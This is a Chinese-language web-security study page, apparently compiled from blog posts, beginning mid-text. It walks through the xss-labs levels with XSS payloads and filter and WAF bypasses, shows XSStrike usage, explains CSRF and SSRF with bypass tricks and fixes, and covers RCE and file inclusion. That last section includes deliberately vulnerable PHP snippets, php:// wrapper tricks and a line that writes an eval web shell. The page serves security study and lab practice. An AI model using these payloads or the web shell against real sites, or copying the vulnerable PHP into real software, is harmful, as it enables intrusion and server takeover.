2.&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&gt;
3.&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;
</code></pre>
<p><strong>iframe</strong></p>
<pre><code>XSS利用方式1
&lt;iframe src=javascript:alert('xss');height=5width=1000 /&gt;&lt;iframe&gt;
XSS利用方式2
&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
&lt;!--原code--&gt;
&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;
&lt;!--base64编码--&gt;
&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
XSS利用方式3
&lt;iframe src=&quot;aaa&quot; οnmοuseοver=alert('xss') /&gt;&lt;iframe&gt;
XSS利用方式3
&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p><strong>svg标签</strong></p>
<pre><code>&lt;svg onload=alert(1)&gt;
</code></pre>
<p><strong>level 1</strong><br>
直接在name赋值个弹窗即可<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634295771067.png" alt="" loading="lazy"><br>
<strong>level 2(&quot;&gt;闭合标签绕过)</strong><br>
尝试赋值</p>
<pre><code>&lt;script&gt;alert()&lt;/script&gt;
</code></pre>
<p>发现失败，查看源代码<br>
发现存在一个htmlspecialchars转化函数<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634295775611.png" alt="" loading="lazy"><br>
分析发现这个函数是将字符串实体化了<br>
htmlspecialchars() 函数把预定义的字符转换为 HTML 实体， 把符号转换为实体化标签，xss经常过滤的情况。<br>
预定义的字符是：</p>
<pre><code>&amp; （和号）成为 &amp;
&quot; （双引号）成为 &quot;
’ （单引号）成为 ’
&lt; （小于）成为 &lt;
&gt; （大于）成为 &gt;
</code></pre>
<p>实例：</p>
<pre><code>&lt;?php
$str=&quot;this is a &lt;b&gt;test&lt;/b&gt;&quot;;
echo $str;
echo &quot;&lt;br&gt;&quot;;
echo htmlspecialchars($str);
?&gt;
</code></pre>
<p>结果：</p>
<figure data-type="image" tabindex="36"><img src="https://jinqipiaopiao.github.io//post-images/1634295781091.png" alt="" loading="lazy"></figure>
<p>所以我们不能使用带&lt;&gt;的进行payload，都是回显的地方由两处，第二个地方是没有函数转义的</p>
<figure data-type="image" tabindex="37"><img src="https://jinqipiaopiao.github.io//post-images/1634295784755.png" alt="" loading="lazy"></figure>
<p>所以我们可以闭合前面的input语句，然后加入alert</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="38"><img src="https://jinqipiaopiao.github.io//post-images/1634295789577.png" alt="" loading="lazy"></figure>
<p>如何判断是双引号闭合还是单引号闭合<br>
拿level2为例子<br>
输入'<br>
审查元素</p>
<figure data-type="image" tabindex="39"><img src="https://jinqipiaopiao.github.io//post-images/1634295809698.png" alt="" loading="lazy"></figure>
<p>输入&quot;<br>
审查元素</p>
<figure data-type="image" tabindex="40"><img src="https://jinqipiaopiao.github.io//post-images/1634295813626.png" alt="" loading="lazy"></figure>
<p>输入1<br>
审查元素</p>
<figure data-type="image" tabindex="41"><img src="https://jinqipiaopiao.github.io//post-images/1634295819019.png" alt="" loading="lazy"></figure>
<p>三者对比，可知是双引号闭合</p>
<p><strong>level 3（事件绕过+'符号闭合）</strong><br>
测试上述两种代码发现都不行，查看源代码发现两处的字符串都被htmlspecialchars函数转义了，所以我们不能使用&lt;&gt;来payload，那么我们可以利用鼠标点击事件进行payload</p>
<figure data-type="image" tabindex="42"><img src="https://jinqipiaopiao.github.io//post-images/1634295825327.png" alt="" loading="lazy"></figure>
<p>payload语句</p>
<pre><code>'οnclick='alert(1)
</code></pre>
<p>前面的单引号与value的左边的单引号闭合，后面的双引号与value的右边的单引号闭合<br>
提交后如何点击输入框成功</p>
<figure data-type="image" tabindex="43"><img src="https://jinqipiaopiao.github.io//post-images/1634295829597.png" alt="" loading="lazy"></figure>
<p><strong>level 4（事件绕过+&quot;符号闭合）</strong><br>
测试第3关的代码发现不行，f12查看元素发现</p>
<figure data-type="image" tabindex="44"><img src="https://jinqipiaopiao.github.io//post-images/1634295834453.png" alt="" loading="lazy"></figure>
<p>value因为是双引号没有闭合掉，所以我们将单引号改为双引号即可通过</p>
<pre><code>&quot;οnclick=&quot;alert(1)
</code></pre>
<p><strong>level 5（herf绕过+符号闭合）</strong><br>
尝试使用</p>
<pre><code>“οnclick=&quot;alert(1)
</code></pre>
<p>发现on进行替换变成o_n,那么我们就不能使用鼠标事件了</p>
<figure data-type="image" tabindex="45"><img src="https://jinqipiaopiao.github.io//post-images/1634295839867.png" alt="" loading="lazy"></figure>
<p>查看元素，发现这个函数可能是在input里面执行的，那么我们可以将<code>&lt;input</code>闭合掉</p>
<figure data-type="image" tabindex="46"><img src="https://jinqipiaopiao.github.io//post-images/1634295845152.png" alt="" loading="lazy"></figure>
<p>使用如下代码发现script也被替换了</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="47"><img src="https://jinqipiaopiao.github.io//post-images/1634295853094.png" alt="" loading="lazy"></figure>
<p>那么我们可以借助a herf属性，自己创建一个javascript代码</p>
<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;
</code></pre>
<p>然后点击输入框附近的链接即可成功。</p>
<p><strong>level 6（大小写绕过）</strong><br>
使用前5次的payload，发现都不行，on，src，herf都被替换了</p>
<figure data-type="image" tabindex="48"><img src="https://jinqipiaopiao.github.io//post-images/1634295869788.png" alt="" loading="lazy"></figure>
<p>关键字都被过滤，使用大写替绕过</p>
<pre><code>&quot;&gt;&lt;a hRef=&quot;javaScript:alert(1)&quot;&gt;
</code></pre>
<p><strong>level 7（双写绕过）</strong><br>
发现大写也无法绕过了，查看源代码发现有小写函数</p>
<figure data-type="image" tabindex="49"><img src="https://jinqipiaopiao.github.io//post-images/1634295876803.png" alt="" loading="lazy"></figure>
<p>都是发现不是替换成o_n而是将on直接变成空字符，那么我们可以双写进行绕过</p>
<pre><code>&quot;&gt;&lt;a hhrefref=&quot;javasscriptcript:alert(1)&quot;&gt;
</code></pre>
<p><strong>level 8（编码绕过）</strong><br>
大小写，双写均不行，替换为unicode编码</p>
<figure data-type="image" tabindex="50"><img src="https://jinqipiaopiao.github.io//post-images/1634295883329.png" alt="" loading="lazy"></figure>
<p><strong>level 9（特殊绕过）</strong><br>
查看代码，发现代码会检测是否存在http://</p>
<figure data-type="image" tabindex="51"><img src="https://jinqipiaopiao.github.io//post-images/1634295889476.png" alt="" loading="lazy"></figure>
<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;/*http://*/
</code></pre>
<p><strong>less 10（type绕过）</strong><br>
f12查看元素发现</p>
<figure data-type="image" tabindex="52"><img src="https://jinqipiaopiao.github.io//post-images/1634295894746.png" alt="" loading="lazy"></figure>
<p>但是type是hidden，被隐藏了，所以我们必须都试一次</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<p><strong>level 11（referer头绕过）</strong></p>
<figure data-type="image" tabindex="53"><img src="https://jinqipiaopiao.github.io//post-images/1634295900283.png" alt="" loading="lazy"></figure>
<p>http referer 头，检测来源。<br>
浏览器会检测此JS代码是否来自CSRF跨站请求脚本。检测来源，</p>
<figure data-type="image" tabindex="54"><img src="https://jinqipiaopiao.github.io//post-images/1634295905032.png" alt="" loading="lazy"></figure>
<p>如果管理员在登录状态的情况下，进入攻击方的带有登录时触发了添加管理员账号和密码的漏洞的网站，那么就会导致后台添加了新的账号和密码<br>
如何防范：检测来源，也就是浏览器的同源策略，看看是否来自同一个域名，不是同一个域名的不接受。<br>
token验证会解决这个问题<br>
此关卡在referer头输入即可</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<figure data-type="image" tabindex="55"><img src="https://jinqipiaopiao.github.io//post-images/1634295912396.png" alt="" loading="lazy"></figure>
<p><strong>level 12（agent绕过）</strong></p>
<figure data-type="image" tabindex="56"><img src="https://jinqipiaopiao.github.io//post-images/1634295918012.png" alt="" loading="lazy"></figure>
<p>payload:</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<figure data-type="image" tabindex="57"><img src="https://jinqipiaopiao.github.io//post-images/1634295926147.png" alt="" loading="lazy"></figure>
<p><strong>level 13（cookie绕过）</strong><br>
抓包发现有cookie<br>
尝试在cookie后面加入</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634295932725.png" alt="" loading="lazy"><br>
成功</p>
<p><strong>level 14</strong><br>
<strong>level 15（文件包含）</strong><br>
审查元素</p>
<figure data-type="image" tabindex="58"><img src="https://jinqipiaopiao.github.io//post-images/1634295940027.png" alt="" loading="lazy"></figure>
<p>可以看到我们提交的参数src的值被插入到了标签的class属性值中，但是前面还有ng-include这样的字符。<br>
ng-include是angular js中的东西，其作用相当于php的include函数。这里就是将1.gif这个文件给包含进来。<br>
先尝试看看能不能直接闭合标签来触发弹窗</p>
<figure data-type="image" tabindex="59"><img src="https://jinqipiaopiao.github.io//post-images/1634295945599.png" alt="" loading="lazy"></figure>
<p>看出被实体化了<br>
先看看源文件的代码</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634295952392.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634295962066.png" alt="" loading="lazy"></p>
<p>既然此处用了ng-include指令的话，先了解一下其具体的用法。</p>
<pre><code>1、ng-include 指令用于包含外部的 HTML文件。
2、包含的内容将作为指定元素的子节点。
3、ng-include 属性的值可以是一个表达式，返回一个文件名。
4、默认情况下，包含的文件需要包含在同一个域名下。
特别值得注意的几点如下：
1.ng-include,如果单纯指定地址，必须要加引号
2.ng-include,加载外部html，script标签中的内容不执行
3.ng-include,加载外部html中含有style标签样式可以识别
</code></pre>
<p>既然这里可以包含html文件，那么也就可以包含之前有过xss漏洞的源文件<br>
构造代码：</p>
<pre><code>?src='level1.php?name=&lt;img src=1 οnerrοr=alert()&gt;'
</code></pre>
<p><strong>level 16（%0a绕过）</strong><br>
查看代码发现script，/都进行过滤</p>
<figure data-type="image" tabindex="60"><img src="https://jinqipiaopiao.github.io//post-images/1634295969874.png" alt="" loading="lazy"></figure>
<p>采用换行符%0a进行绕过,触发xss。</p>
<pre><code>&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;
</code></pre>
<p><strong>level 17（闭合标签绕过）</strong></p>
<figure data-type="image" tabindex="61"><img src="https://jinqipiaopiao.github.io//post-images/1634295975129.png" alt="" loading="lazy"></figure>
<p>闭合<code>&lt;embed&gt;</code>即可</p>
<pre><code>level17.php?arg01&amp;arg02=&quot;&gt; onmouseover=alert()
</code></pre>
<p><strong>level 18（闭合标签绕过）</strong><br>
<strong>跟less 19一致，只是多了一个注入点通过闭合<embed>即可</strong></p>
<pre><code>level17.php?arg01&amp;arg02=&quot;&gt; οnmοuseοver=alert()
</code></pre>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/119718207</p>
<h1 id="web漏洞-xss跨站之waf绕过及安全修复">WEB漏洞-XSS跨站之WAF绕过及安全修复</h1>
<p>waf防护演示<br>
靶场：xss-labs</p>
<figure data-type="image" tabindex="62"><img src="https://jinqipiaopiao.github.io//post-images/1634297807412.png" alt="" loading="lazy"></figure>
<p>被安全狗拦截</p>
<figure data-type="image" tabindex="63"><img src="https://jinqipiaopiao.github.io//post-images/1634297811186.png" alt="" loading="lazy"></figure>
<p>分析拦截情况<br>
分析方法：<br>
1、通过去除关键词或关键词的其中些字母判断拦截了什么关键词，如下正常</p>
<figure data-type="image" tabindex="64"><img src="https://jinqipiaopiao.github.io//post-images/1634297815210.png" alt="" loading="lazy"></figure>
<p>2、分析了拦截情况可知也可能是尖括号里面如果有s、o之类的关键词其中的某个或多个字母的话就会拦截，正则表达式</p>
<figure data-type="image" tabindex="65"><img src="https://jinqipiaopiao.github.io//post-images/1634297819429.png" alt="" loading="lazy"></figure>
<p>3、不拦截，但是不管用</p>
<figure data-type="image" tabindex="66"><img src="https://jinqipiaopiao.github.io//post-images/1634297823834.png" alt="" loading="lazy"></figure>
<p>4、正常，并且可以访问</p>
<figure data-type="image" tabindex="67"><img src="https://jinqipiaopiao.github.io//post-images/1634297829100.png" alt="" loading="lazy"></figure>
<p>/结束</p>
<figure data-type="image" tabindex="68"><img src="https://jinqipiaopiao.github.io//post-images/1634297834287.png" alt="" loading="lazy"></figure>
<p>常规WAF绕过思路</p>
<pre><code>标签语法替换
特殊符号干扰
/ #
提交方式更改
垃圾数据溢出
加密解密算法
结合其他漏洞绕过
</code></pre>
<p>XSStrike自动化工具说明<br>
靶场：xss-labs，dvws</p>
<p>各个选项说明</p>
<pre><code>-h, --help 显示帮助信息并退出
-u, --url 目标url
–data post方法的数据
-f, --file 从文件读取payloads
-t, --threads 线程数量
-l, --level 爬取级别
-t, --encode payload采取的编码
–json json格式的数据
–path 指定路径注入
–seeds 从文件加载url
–fuzzer fuzz工具
–update 更新
–timeout 超时时间
–params 寻找参数
–crawl 爬取
–proxy 使用代理
–blind 爬取时盲注
–skip 跳过确认等
–skip-dom 跳过dom检查
–headers 添加headers
-d, --delay 两次请求之间的延迟

-u或--url
添加目标url，单个GET方法
</code></pre>
<figure data-type="image" tabindex="69"><img src="https://jinqipiaopiao.github.io//post-images/1634297841642.png" alt="" loading="lazy"></figure>
<pre><code>?name=&lt;A/+/onmOuSeoVer%0d=%0dconfirm()%0dx&gt;v3dm0s
</code></pre>
<p>挑选其中一个手动注入发现成功绕过</p>
<figure data-type="image" tabindex="70"><img src="https://jinqipiaopiao.github.io//post-images/1634297850192.png" alt="" loading="lazy"></figure>
<p><strong>--data</strong><br>
post方法的数据（多个参数）<br>
python xsstrike.py -u &quot;http://IP地址/vulnerabilities/xss_s/&quot; --data &quot;txtName=test&amp;mtxMessage=This+is+a+test+comment.&amp;btnSign=Sign+Guestbook&quot;</p>
<figure data-type="image" tabindex="71"><img src="https://jinqipiaopiao.github.io//post-images/1634297855814.png" alt="" loading="lazy"></figure>
<p><strong>--seeds</strong><br>
从文件<br>
选项:–seeds 不使用-u选项<br>
python xsstrike.py --seeds urls.txt</p>
<figure data-type="image" tabindex="72"><img src="https://jinqipiaopiao.github.io//post-images/1634297869277.png" alt="" loading="lazy"></figure>
<p><strong>--path</strong></p>
<p>测试url路径组件</p>
<pre><code>想要在URL路径中注入这样的有效负载 http://example.com/search/&lt;payload&gt;
python xsstrike.py -u &quot;http://example.com/search/form/query&quot; --path
</code></pre>
<p><strong>--json</strong><br>
POST数据为json格式</p>
<pre><code>python xsstrike.py -u &quot;http://example.com/search.php&quot; --data '{&quot;q&quot;:&quot;query&quot;}' --json
</code></pre>
<p><strong>--crawl</strong><br>
爬取</p>
<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r&quot; --crawl
</code></pre>
<figure data-type="image" tabindex="73"><img src="https://jinqipiaopiao.github.io//post-images/1634297875762.png" alt="" loading="lazy"></figure>
<p><strong>--level</strong><br>
爬取深度<br>
选项-l或–level 默认为2</p>
<pre><code>python xsstrike.py -u &quot;http://IP地址/vulnerabilities/&quot; --crawl -l 5
</code></pre>
<figure data-type="image" tabindex="74"><img src="https://jinqipiaopiao.github.io//post-images/1634297880885.png" alt="" loading="lazy"></figure>
<p><strong>-f或--file</strong><br>
从文件读取payloads</p>
<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r?name=''&quot; -f payloads.txt
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634297885502.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634297893131.png" alt="" loading="lazy"></p>
<p><strong>--params</strong><br>
查找隐藏参数</p>
<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r&quot; --params
</code></pre>
<figure data-type="image" tabindex="75"><img src="https://jinqipiaopiao.github.io//post-images/1634297897389.png" alt="" loading="lazy"></figure>
<p><strong>--fazzer</strong></p>
<figure data-type="image" tabindex="76"><img src="https://jinqipiaopiao.github.io//post-images/1634297901148.png" alt="" loading="lazy"></figure>
<p><strong>Fuzz下XSS绕过WAF</strong><br>
靶场：xss-labs<br>
使用：fuzz模糊搜索</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634297906542.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634297911823.png" alt="" loading="lazy"></p>
<p>安全修复方案<br>
开启httponly<br>
https://www.yisu.com/zixun/310495.html</p>
<p>输入过滤<br>
对输入进行过滤，不允许可能导致XSS攻击的字符输入</p>
<p>输出转义<br>
根据输出点的位置对输出到前端的内容进行适当转义</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/119747063</p>
<h1 id="csrf及ssrf漏洞案例讲解">CSRF及SSRF漏洞案例讲解</h1>
<figure data-type="image" tabindex="77"><img src="https://jinqipiaopiao.github.io//post-images/1634298208868.png" alt="" loading="lazy"></figure>
<p>CSRF漏洞解释，原理<br>
CSRF(Cross-site request forgery)<br>
跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634298213135.png" alt="" loading="lazy"><br>
<strong>原理详解</strong></p>
<p>攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作<br>
XSS 利用站点内内的信任用户，盗取cookie<br>
CSRF通过伪装成受信任用户请求受信任的网站<br>
利用目标用户的合法身份，以目标的名义执行某些非法参数<br>
利用条件：已经登录系统，用户访问URL	已存在的网站中让用户跳转<br>
CSRF漏洞检测，案例，防御</p>
<p><strong>防御方案</strong><br>
1.当用户发送重要的请求时输入验证码<br>
2.涉及随机TOKEN ---数据包的唯一值<br>
3.检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>
4.设置验证码<br>
5.限制请求方式只能为post0<br>
<strong>SSRF（服务器端请求伪造）</strong></p>
<pre><code>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为 
    它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 
注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。
</code></pre>
<p><strong>0x01 可能出现的地方</strong></p>
<pre><code>1.社交分享功能：获取超链接的标题等内容进行显示
2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
3.在线翻译：给网址翻译对应网页的内容
4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
8.数据库内置功能：数据库的比如mongodb的copyDatabase函数
9.邮件系统：比如接收邮件服务器地址
10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞
一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）
</code></pre>
<p><strong>0x02 漏洞验证</strong></p>
<pre><code>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求
比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞
2.dnslog等工具进行测试，看是否被访问
--可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。
3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址
--从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址
--通过二级域名暴力猜解工具模糊猜测内网地址
4.直接返回的Banner、title、content等信息
5.留意bool型SSRF
</code></pre>
<p><strong>0x03 利用方式</strong></p>
<pre><code>1.让服务端去访问相应的网址
2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms
3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）
5.攻击内网应用程序（利用跨协议通信技术）
6.判断内网主机是否存活：方法是访问看是否有端口开放
7.DoS攻击（请求大文件，始终保持连接keep-alive always）
</code></pre>
<p><strong>0x04 绕过小技巧</strong></p>
<pre><code>注：参考[8]会有更详细的绕过方式总结
1.http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的
2.各种IP地址的进制转换
3.URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/
4.短网址绕过 http://t.cn/RwbLKDx
5.xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）
指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)
6.限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80
7.探测内网域名，或者将自己的域名解析到内网ip
8.例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，
但这样可以用 http://abc@10.153.138.81/ 绕过
</code></pre>
<p><strong>0x05 漏洞示例</strong></p>
<pre><code>1.Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf
2.discuz！的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换）
3.weblogic的ssrf
</code></pre>
<p><strong>0x06 漏洞修复</strong></p>
<pre><code>1.禁止跳转
2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题
4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）
5.限制请求的端口为http常用的端口，比如 80、443、8080、8090
6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
</code></pre>
<p><strong>0x07 漏洞利用中牵涉的小技巧</strong></p>
<pre><code>crontab -l 显示当前计划任务
crontab -r 清除当前计划任务
</code></pre>
<p><strong>端口转发工具 socat</strong></p>
<pre><code>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行
AddType application/x-httpd-php
</code></pre>
<h1 id="三十rce代码及命令执行漏洞全解">三十：RCE代码及命令执行漏洞全解</h1>
<p>摘要：在WEB应用中有时候程序员为了考虑灵活性，简明性，会在代码调用或者命令执行函数去处理。比如当应用在调用一些能将字符串转换为代码的函数时，没有考虑用户是都能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞</p>
<figure data-type="image" tabindex="78"><img src="https://jinqipiaopiao.github.io//post-images/1634364175163.png" alt="" loading="lazy"></figure>
<p><strong>函数eval:</strong></p>
<p>eval() 函数把字符串按照 PHP 代码来计算。<br>
该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>
如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
<p><strong>函数system：</strong><br>
system — 执行外部程序，并且显示输出</p>
<pre><code>$code=$_GET['x'];
echo system($code)         //x=ipconfig   x=ver
</code></pre>
<p><strong>漏洞形成条件：</strong></p>
<p>可控变量，以及漏洞函数  无拓展功能，一般没有此类函数<br>
<strong>文件包含漏洞：</strong><br>
本地文件包含和远程文件包含漏洞，自己的服务器允许别人的php代码，实现远程文件包含</p>
<pre><code>index.php
&lt;?php
$file = $_GET['file'];
if(isset($file)){
	include(&quot;$file&quot;);
	//   require();
	//   require_once();
	//   include_once();
}else{
	echo &quot;file fail&quot;;
}
同文件目录下存在其他文件会读取，目录下存在index.php，默认访问index.php，    127.0.0.1/include/?file=dudu.php
../../etc/httpd.conf  本地包含漏洞可以读取其他文件           172.0.0.1/uploads/include.php?file=图片马的地址
有文件包含，直接上传，或者日志进行上传。蚁剑连马时候，连得是目标马的地址
</code></pre>
<p>**PHP中造成文件包含的四个函数 **<br>
<strong>1、include(),require()</strong></p>
<p>当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。<br>
当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。</p>
<p><strong>2.include_once()和include()功能相同，区别在当重复调用同一文件时。程序只调用一次</strong></p>
<p>require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>当上述的四个函数包含一个新文件时，该文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型，如果被包含的是txt文件，图片文件，远程URL，也都将作为PHP代码执行</p>
<figure data-type="image" tabindex="79"><img src="https://jinqipiaopiao.github.io//post-images/1634364181179.png" alt="" loading="lazy"></figure>
<p><strong>本地文件包含，远程文件包含的区别</strong></p>
<p><strong>1、本地文件包含LFI（local File Include）</strong><br>
<strong>2.远程文件包含RFI（Remote File Include）需要ini中allow_url_include = on,allow_url_fopen = on</strong></p>
<figure data-type="image" tabindex="80"><img src="https://jinqipiaopiao.github.io//post-images/1634364184648.png" alt="" loading="lazy"></figure>
<p><strong>PHP伪协议</strong></p>
<pre><code>事实就是支持的协议和封装的协议12种
file:// - 访问本地文件系统
http:// - 访问http网站
ftp:// - 访问FTP（s）URLS
php:// - 访问各个输入输出流
zlib:// - 压缩流
data：// - 数据（RFC 2397）
glob：// -查找匹配的文件路径模型
ssh2：// - Secure Shell 2
rar:// - RAR
ogg:// - 音频流
expect:// - 处理交互式的流
        
目标文件  robots.txt	 路径为127.0.0.1/www/robots.txt  	 &lt;?php phpinfo();?&gt;
robots.zip	127.0.0.1/www/robots.zip	robots.txt
1.php	127.0.0.1/www/1.php	&lt;?php echo('Hello world')?&gt;
flag.txt	D:/flag.txt	flag{123test}
</code></pre>
<p><strong>常用协议：</strong><br>
<strong>1.目录遍历获取flag：</strong></p>
<figure data-type="image" tabindex="81"><img src="https://jinqipiaopiao.github.io//post-images/1634364189695.png" alt="" loading="lazy"></figure>
<p><strong>2.php://input                              php://filter</strong></p>
<p><strong>(1) php://input用于执行php代码</strong></p>
<figure data-type="image" tabindex="82"><img src="https://jinqipiaopiao.github.io//post-images/1634364193742.png" alt="" loading="lazy"></figure>
<p><strong>也可以写入shell获取服务器权限</strong></p>
<pre><code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[CMD])?&gt;');?&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634364197993.png" alt="" loading="lazy"><br>
<strong>（2）php://filter 用于读取源码</strong></p>
<pre><code>?file=php://filter/convert.base64-encode/resource=1.php
</code></pre>
<figure data-type="image" tabindex="83"><img src="https://jinqipiaopiao.github.io//post-images/1634364202433.png" alt="" loading="lazy"></figure>
<p>**    3.file://**</p>
<p>用于读取本地系统文件，在CTF中读取本地文件</p>
<figure data-type="image" tabindex="84"><img src="https://jinqipiaopiao.github.io//post-images/1634364206764.png" alt="" loading="lazy"></figure>
<p>**4.data:// **</p>
<pre><code>可以写入后门，获取权限执行任意命令
</code></pre>
<figure data-type="image" tabindex="85"><img src="https://jinqipiaopiao.github.io//post-images/1634364211365.png" alt="" loading="lazy"></figure>
<p><strong>5.zip://</strong></p>
<pre><code>zip://[压缩文件的绝对路径]#[压缩文件的子文件名]
</code></pre>
<figure data-type="image" tabindex="86"><img src="https://jinqipiaopiao.github.io//post-images/1634364215617.png" alt="" loading="lazy"></figure>
<p><strong>6.phar协议</strong></p>
<p>的作用是归档，将多个文件分组为一个文件。可以处理tar和zip文件</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634364220770.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634364225174.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634364230531.png" alt="" loading="lazy"></p>
